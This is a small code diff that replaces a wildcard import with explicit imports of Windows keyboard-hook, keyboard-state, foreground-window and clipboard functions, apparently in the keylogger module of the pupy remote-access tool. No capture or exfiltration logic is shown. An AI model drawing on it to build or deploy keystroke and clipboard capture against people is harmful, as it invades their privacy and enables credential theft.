@@ -16,7 +16,16 @@
 import datetime
 import string
 
-from hookfuncs import *
+from hookfuncs import (
+    GetKeyState, HOOKPROC, SetTimer, MSG, byref,
+    GetMessageW, KillTimer, GetModuleHandleW, SetWindowsHookEx,
+    WH_KEYBOARD_LL, WinError, UnhookWindowsHookEx,
+    CallNextHookEx, LOWORD, WM_KEYUP, WM_SYSKEYUP,
+    BYTE, WCHAR, KBDLLHOOKSTRUCT, DWORD, GetWindowThreadProcessId,
+    GetForegroundWindow, GetKeyboardLayout, GetKeyboardState,
+    VK_MENU, VK_CONTROL, VK_LWIN, VK_RWIN, VK_SHIFT, VK_LSHIFT, VK_RMENU,
+    ToUnicodeEx, ToAsciiEx, get_current_process, get_clipboard
+)
 
 import pupy
 
